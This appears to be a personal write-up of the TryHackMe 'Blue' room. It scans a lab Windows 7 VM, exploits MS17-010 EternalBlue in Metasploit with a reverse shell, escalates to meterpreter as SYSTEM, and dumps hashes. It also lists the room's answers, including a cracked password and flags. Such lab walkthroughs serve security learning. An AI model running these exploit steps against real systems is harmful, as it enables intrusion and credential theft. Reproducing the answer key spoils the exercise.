<h1>Offensive Pentesting learning path> Getting Started</h1>

<p align="center">August 21, 2024</p>
<p align="center">Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{106}}$$-day-streak in  <a href="https://tryhackme.com/">TryHackMe</a>.</p>
 
<h1 align="center">
  $$\textcolor{#3bd62d}{\textnormal{Blue}}$$
</h1>
<p align="center">Deploy & hack into a Windows machine, leveraging common misconfigurations issues.</p>
<p align="center">Access this TryHackMe Room clicking <a href="https://tryhackme.com/room/blue">Blue</a>.<br>
<p align="center">
  <img height="120px" hspace="20" src="https://github.com/user-attachments/assets/4a8d6a3e-fa6f-4e57-87b5-90e73afea584">
  <img height="120px" src="https://github.com/user-attachments/assets/4a8a75f7-200a-4528-96d5-c8fab1232884">
</p>


<h2>Task 1 . Recon</h2>

<p>Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused. </p>

<p>Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused. </p>

<p>Link to Ice, the sequel to Blue: [Link](https://tryhackme.com/room/ice)<br>

You can check out the third box in this series, Blaster, here: [Link](https://tryhackme.com/room/blaster)</p>

<p>The virtual machine used in this room (Blue) can be downloaded for offline usage from https://darkstar7471.com/resources.html<br>
Enjoy the room! For future rooms and write-ups, follow @darkstar7471 on Twitter.</p>

<h4 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h4>
<br>

> 1.1. <em>Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)</em>. Hint : Command: nmap -sV -vv --script vuln TARGET_IP.<br><a id='1.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 1.2. <em>How many ports are open with a port number under 1000?</em>. Hint : Near the top of the nmap output: PORT STATE SERVICE.<br><a id='1.2'></a>
>> <code><strong>3</strong></code>

<br>

> 1.3. <em>What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)</em>. Hint : Revealed by the ShadowBrokers, exploits an issue within SMBv1,<br><a id='1.3'></a>
>> <code><strong>ms17-010</strong></code>

<br>


<p>Used nmap, and discovered 9 ports open (3 unders 1000).<br>
Discovered that <code>SMBv1</code> is vulnerable to <code>Remote Code Execution, (ms17-010)</code>.</p>

```shell
:~#  nmap -sV -vv --script vuln blue
...
Discovered open port 139/tcp on 10.10.123.170
Discovered open port 3389/tcp on 10.10.123.170
Discovered open port 445/tcp on 10.10.123.170
Discovered open port 135/tcp on 10.10.123.170
Discovered open port 49160/tcp on 10.10.123.170
Increasing send delay for 10.10.123.170 from 0 to 5 due to 69 out of 228 dropped probes since last increase.
Discovered open port 49154/tcp on 10.10.123.170
Discovered open port 49152/tcp on 10.10.123.170
Discovered open port 49153/tcp on 10.10.123.170
Discovered open port 49158/tcp on 10.10.123.170
Completed SYN Stealth Scan at 19:27, 5.08s elapsed (1000 total ports)
Initiating Service scan at 19:27
Scanning 9 services on blue (10.10.123.170)
...
Not shown: 991 closed ports
Reason: 991 resets
PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp   open  netbios-ssn  syn-ack ttl 128 Microsoft Windows netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp   open  microsoft-ds syn-ack ttl 128 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
3389/tcp  open  tcpwrapped   syn-ack ttl 128
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_sslv2-drown: 
49152/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49153/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49154/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49158/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49160/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
...
Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
...
```


<br>

<h2>Task 2 . Gain Access</h2>

<p>Exploit the machine and gain a foothold.</p>

<h4 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h4>
<br>

> 2.1. <em>Start Metasploit.</em>. Hint : Command: msfconsole.<br><a id='2.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 2.2. <em>Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)</em>. Hint : search ms??<br><a id='2.2'></a>
>> <code><strong>search ms??</strong></code>

<br>

<p>Started <code>Metasploit</code>, and found the exploitation code to run against the machine;</p>

```shell
:~#  msfupdate
...
:~# mfsconsole -q
...
msf6 > search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

> 2.3. <em>Show options and set the one required value. What is the name of this value? (All caps for submission).</em>. Hint :Command: show options.<br><a id='2.3'></a>
>> <code><strong>RHOSTS</strong></code>

<br>

```shell
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/us
                                             ing-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Serve
                                             r 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 20
                                             08 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Win
                                             dows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.3.227      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.123.170
RHOSTS => 10.10.123.170
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

<p>Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:<br>
<code>set payload windows/x64/shell/reverse_tcp</code></p>

```shell
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

> 2.4. <em>With that done, run the exploit!</em>. Hint Command: run (or exploit).<br><a id='2.4'></a>
>> <code><strong>No answer needed</strong></code>

<br>

<p>It worked promptly after typing <code>run</code>, and <code>ENTER</code>.</p>

```shell
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.10.3.227:4444 
[*] 10.10.123.170:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.123.170:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.123.170:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.123.170:445 - The target is vulnerable.
[*] 10.10.123.170:445 - Connecting to target for exploitation.
[+] 10.10.123.170:445 - Connection established for exploitation.
[+] 10.10.123.170:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.123.170:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.123.170:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.123.170:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.123.170:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.123.170:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.123.170:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.123.170:445 - Sending all but last fragment of exploit packet
[*] 10.10.123.170:445 - Starting non-paged pool grooming
[+] 10.10.123.170:445 - Sending SMBv2 buffers
[+] 10.10.123.170:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.123.170:445 - Sending final SMBv2 buffers.
[*] 10.10.123.170:445 - Sending last fragment of exploit packet!
[*] 10.10.123.170:445 - Receiving response from exploit packet
[+] 10.10.123.170:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.123.170:445 - Sending egg to corrupted connection.
[*] 10.10.123.170:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.123.170
[*] Command shell session 1 opened (10.10.3.227:4444 -> 10.10.123.170:49211) at 2025-03-09 19:50:13 +0000
[+] 10.10.123.170:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.123.170:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.123.170:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>

```

> 2.5. <em>Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. </em>. Hint Command: run (or exploit).<br><a id='2.4'></a>
>> <code><strong>No answer needed</strong></code>

<p>Confirmed, and it run correctly.</p>


<h2>Task 3 . Escalate</h2>

<h4 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h4>
<br>

> 3.1. <em>If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) </em>. Hint : Google this: shell_to_meterpreter<br><a id='3.1'></a>
>> <code><strong>Google this: shell_to_meterpreter</strong></code>

```shell
C:\Windows\system32>^Z
Background session 1? [y/N]  y
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

<p>Googled <code> shell_to_meterpreter</code>, and discovered the below instruction.</p>

![image](https://github.com/user-attachments/assets/7e688419-f199-4c54-8788-e2dd02b5ca51)

<br>

> 3.2. <em>Select this (use MODULE_PATH). Show options, what option are we required to change?</em>.<br><a id='3.2'></a>
>> <code><strong>SESSION</strong></code>

```shell
msf6 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detec
                                       t).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(multi/manage/shell_to_meterpreter) > 
```

<br>

> 3.3. <em>Set the required option, you may need to list all of the sessions to find your target here. </em>. Hint : sessions -l<br><a id='3.3'></a>
>> <code><strong>No answer needed</strong></code>

```shell
msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type               Information                                    Connection
  --  ----  ----               -----------                                    ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.  10.10.3.227:4444 -> 10.10.123.170:49211 (10.1
                               7601] -----                                    0.123.170)

msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/shell_to_meterpreter) > 
```

<br>

> 3.4. <em>Run! If this doesn't work, try completing the exploit from the previous task once more. </em>. Hint : Command: run (or exploit)<br><a id='3.4'></a>
>> <code><strong>No answer needed</strong></code>

```shell
msf6 post(multi/manage/shell_to_meterpreter) > run
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.3.227:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (203846 bytes) to 10.10.123.170
[*] Meterpreter session 2 opened (10.10.3.227:4433 -> 10.10.123.170:49226) at 2025-03-09 20:03:12 +0000
[*] Stopping exploit/multi/handler
```

<br>

> 3.5. <em>Once the meterpreter shell conversion completes, select that session for use. </em>. Hint : sessions SESSION_NUMBER.<br><a id='3.5'></a>
>> <code><strong>No answer needed</strong></code>

```shell

msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                 Connection
  --  ----  ----                     -----------                                 ----------
  1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6  10.10.3.227:4444 -> 10.10.123.170:49211 (1
                                     .1.7601] -----                              0.10.123.170)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                10.10.3.227:4433 -> 10.10.123.170:49226 (1
                                                                                 0.10.123.170)

msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > 
```

<br>

> 3.6. <em>Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again. </em><br><a id='3.6'></a>
>> <code><strong>No answer needed</strong></code>

```shell
msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > shell
Process 2268 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

<br>

> 3.7. <em>List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column). </em>.<br><a id='3.7'></a>
>> <code><strong>No answer needed</strong></code>

```shell
C:\Windows\system32>^Z
Background channel 1? [y/N]  y
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 356   692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 548   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 588   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 596   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 604   588   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 644   588   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 692   596   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 700   596   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 708   596   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 764   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 828   816   WmiPrvSE.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wbem\wmiprvse.exe
 884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 908   2968  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\pow
                                                                                ershell.exe
 932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1000  644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 1020  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 1060  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1144  1280  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 1156  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1280  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1316  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1384  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.e
                                                                                xe
 1456  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1520  816   WmiPrvSE.exe
 1588  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Co
                                                                                nfig.exe
 1904  548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 1936  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 2140  548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 2268  908   cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
 2344  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 2548  692   vds.exe               x64   0        NT AUTHORITY\SYSTEM
 2588  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 2688  692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
 3032  692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
 3040  548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe

meterpreter > 
```

<br>

> 3.8. <em>Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. </em>.<br><a id='3.8'></a>
>> <code><strong>No answer needed</strong></code>

```shell
meterpreter > migrate 908
```


<h2>Task 4 . Cracking</h2>

<p>Dump the non-default user's password and crack it!</p>

<h4 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h4>
<br>

> 4.1. <em>Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?.</em>. Hint : Command: nmap -sV -vv --script vuln TARGET_IP.<br><a id='4.1'></a>
>> <code><strong>Jon</strong></code>

<br>

> 4.2. <em>Copy this password hash to a file and research how to crack it. What is the cracked password?</em><br><a id='4.2'></a>
>> <code><strong>alqfna22</strong></code>

<br>

<h2>Task 5 . Find flag!</h2>

<p>Find the three flags planted on this machine. These are not traditional flags, rather, they're meant to represent key locations within the Windows system. Use the hints provided below to complete this room!

</p>

<h4 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h4>
<br>

> 5.1. <em>Flag1? This flag can be found at the system root. </em>. Hint : Can you C it?.<br><a id='5.1'></a>
>> <code><strong>flag{access_the_machine}</strong></code>

<br>

> 5.2. <em>Flag2? This flag can be found at the location where passwords are stored within Windows. *Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.  </em>. Hint : I wish I wrote down where I kept my password. Luckily it's still stored here on Windows.<br><a id='5.2'></a>
>> <code><strong>flag{sam_database_elevated_access}</strong></code>

<br>

> 5.3. <em>flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. </em>. Hint : Revealed by the ShadowBrokers, exploits an issue within SMBv1,<br><a id='5.3'></a>
>> <code><strong>flag{admin_documents_can_be_valuable}</strong></code>


